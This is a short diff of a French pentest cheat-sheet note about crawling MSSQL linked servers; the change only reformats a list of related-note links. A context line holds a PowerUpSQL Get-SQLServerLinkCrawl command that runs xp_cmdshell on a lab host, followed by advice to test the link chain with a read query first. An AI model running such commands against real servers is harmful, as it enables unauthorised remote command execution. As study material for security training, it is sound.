@@ -33,4 +33,7 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'w
 
 Commencer par une requête de lecture (`SELECT @@version`) avant `xp_cmdshell` pour confirmer la portée réelle de la chaîne sans déclencher d'exécution.
 
-**Link** — [[Synthèse - MSSQL]] · [[Cheatsheet - Trusts et forêts]] · [[Cheatsheet - Outils Windows Linux]]
+**Link**
+- [[Synthèse - MSSQL]]
+- [[Cheatsheet - Trusts et forêts]]
+- [[Cheatsheet - Outils Windows Linux]]
